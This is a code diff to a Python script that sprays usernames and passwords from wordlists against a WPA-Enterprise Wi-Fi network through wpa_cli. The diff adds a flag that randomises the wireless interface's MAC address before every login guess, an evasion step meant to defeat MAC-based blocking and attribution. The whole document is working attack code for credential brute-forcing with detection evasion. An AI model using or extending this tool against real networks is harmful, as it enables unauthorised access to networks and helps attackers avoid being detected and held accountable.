@@ -2,6 +2,8 @@
  
 import pexpect
 import argparse
+import random
+import subprocess
  
 #set up arguments
 parser = argparse.ArgumentParser()
@@ -12,6 +14,7 @@ parser.add_argument('-u', '--user-file', help='File with usernames to attack', m
 parser.add_argument('-p', '--pass-file', help='File with passwords to try', metavar='pass-file', dest='pass_file',
                     required=True)
 parser.add_argument('-q', '--quiet', help='Don\'t output every attempt', dest='quiet', action='store_true')
+parser.add_argument('-m', '--mac', help='Scramble MAC address with every attempt', dest='mac', action='store_true')
 args = parser.parse_args()
  
 #set up local information
@@ -22,6 +25,7 @@ with open(args.user_file) as f:
 with open(args.pass_file) as f:
     passwords = [l.rstrip('\n') for l in f.readlines()]
 quiet = args.quiet
+mac = args.mac
 bluetext = '\033[94m'
 greentext = '\033[92m'
 yellowtext = '\033[93m'
@@ -48,6 +52,20 @@ def cleanup(message):
     #clean up so wpa_supplicant doesn't keep spraying login attempts
     wpa_cli.sendline('remove_network {0}'.format(network_id))
     exit(message)
+
+
+def scramble_mac():
+    try:
+        new_mac = format(random.randint(0x0, 0xf), 'x')
+        new_mac += format(random.choice([0x0, 0x2, 0x4, 0x8, 0xa, 0xc, 0xe]), 'x')
+        new_mac += format(random.randint(0x0000000001, 0xfffffffffe), '010x')
+        subprocess.check_call(["ifconfig", interface, "down"])
+        subprocess.check_call(["ifconfig",interface, "hw", "ether", new_mac])
+        subprocess.check_call(["ifconfig", interface, "up"])
+    except:
+        print 'trying again'
+        scramble_mac()
+        return()
  
  
 def guess(user, passw):
@@ -56,6 +74,9 @@ def guess(user, passw):
     result = None
     if not quiet:
         print bluetext + '[*]' + whitetext + ' Trying {0} with {1}'.format(user, passw)
+    if mac:
+        #scramble mac address
+        scramble_mac()
     wpa_cli.sendline('set_network {0} password "{1}"'.format(network_id, passw))
     #attempt to associate
     wpa_cli.sendline('select_network {0}'.format(network_id))
